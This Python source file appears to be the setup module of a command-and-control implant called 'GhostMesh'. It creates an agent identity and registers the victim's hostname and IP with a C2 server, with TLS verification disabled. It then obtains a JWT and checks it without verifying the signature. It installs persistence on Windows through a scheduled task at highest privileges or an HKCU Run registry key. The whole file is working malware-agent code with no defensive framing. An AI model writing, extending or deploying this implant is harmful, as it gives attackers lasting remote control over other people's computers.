import os
import json
import uuid
import requests
from config import CONFIG_PATH, C2_URL, REGISTER_ENDPOINT, LOGIN_ENDPOINT
from jose import jwt, JWTError
from datetime import datetime, timezone
import socket
import platform
import ctypes
import sys
import winreg
import subprocess
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_host_info():
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        ip = "127.0.0.1"
    return hostname, ip

def load_or_create_identity():
    print(f"[DEBUG] Writing identity to: {CONFIG_PATH}")
    if os.path.exists(CONFIG_PATH):
        with open(CONFIG_PATH, "r") as f:
            return json.load(f)

    agent_id = str(uuid.uuid4())
    agent_key = str(uuid.uuid4())

    identity = {"agent_id": agent_id, "agent_key": agent_key}
    with open(CONFIG_PATH, "w") as f:
        json.dump(identity, f)

    return identity

def register(agent_id: str, agent_key: str):
    url = f"{C2_URL}{REGISTER_ENDPOINT}"
    hostname, ip = get_host_info()

    data = {
        "agent_id": agent_id,
        "agent_key": agent_key,
        "netbios": hostname,
        "ip": ip
    }

    try:
        resp = requests.post(url, json=data, verify=False)
        if resp.status_code == 200:
            print("[+] Agent registered successfully.")
        elif resp.status_code == 409:
            print("[*] Agent already registered.")
        else:
            print(f"[-] Registration failed ({resp.status_code}): {resp.text}")
            sys.exit(1)
    except Exception as e:
        print("[-] Registration error:", str(e))
        sys.exit(1)

def login(agent_id: str, agent_key: str) -> str:
    url = f"{C2_URL}{LOGIN_ENDPOINT}"
    data = {
        "agent_id": agent_id,
        "agent_key": agent_key
    }

    try:
        resp = requests.post(url, json=data, verify=False)
        if resp.status_code == 200:
            token = resp.json()["access_token"]
            print("[+] Login successful. JWT received.")
            return token
        else:
            print(f"[-] Login failed ({resp.status_code}): {resp.text}")
            sys.exit(1)
    except Exception as e:
        print("[-] Login error:", str(e))
        sys.exit(1)

def token_valid(token: str) -> bool:
    try:
        # Decode without verifying signature
        payload = jwt.get_unverified_claims(token)
        exp = payload.get("exp")
        if exp is None:
            return False
        now = datetime.now(timezone.utc).timestamp()
        return now < exp
    except JWTError:
        return False

def ensure_user_persistence():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "GhostMesh"

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, exe_path)
            print(f"[+] Persistence installed in HKCU\\...\\Run: {exe_path}")
    except Exception as e:
        print(f"[-] Failed to install user persistence: {e}")

def ensure_admin_persistence():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    task_name = "GhostMesh"

    # Check if the task already exists
    result = subprocess.run(
        ["schtasks", "/Query", "/TN", task_name],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    if result.returncode != 0:
        try:
            subprocess.run([
                "schtasks",
                "/create",
                "/tn", task_name,
                "/tr", f'"{exe_path}"',
                "/sc", "onlogon",
                "/rl", "HIGHEST",
                "/f"
            ], check=True)
            print(f"[+] Persistence installed using schtasks: {exe_path}")
        except Exception as e:
            print(f"[-] Failed to install persistence: {e}")
    else:
        print("[*] Persistence already installed.")

def is_windows():
    return platform.system().lower() == "windows"

def is_admin():
    if not is_windows():
        return False
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def install_persistence():
    if not is_windows():
        print("[*] Persistence skipped: Not a Windows system.")
        return

    if is_admin():
        print("[*] Admin detected. Using scheduled task persistence.")
        ensure_admin_persistence()
    else:
        print("[*] Non-admin detected. Using registry Run key persistence.")
        ensure_user_persistence()


def initialize_agent():
    first_time = not os.path.exists(CONFIG_PATH)
    identity = load_or_create_identity()

    if first_time:
        register(identity["agent_id"], identity["agent_key"])
        token = login(identity["agent_id"], identity["agent_key"])
        identity["jwt"] = token
        with open(CONFIG_PATH, "w") as f:
            json.dump(identity, f)
    elif "jwt" not in identity or not token_valid(identity["jwt"]):
        token = login(identity["agent_id"], identity["agent_key"])
        identity["jwt"] = token
        with open(CONFIG_PATH, "w") as f:
            json.dump(identity, f)
    else:
        token = identity["jwt"]

    install_persistence()

    return {
        "agent_id": identity["agent_id"],
        "jwt": token
    }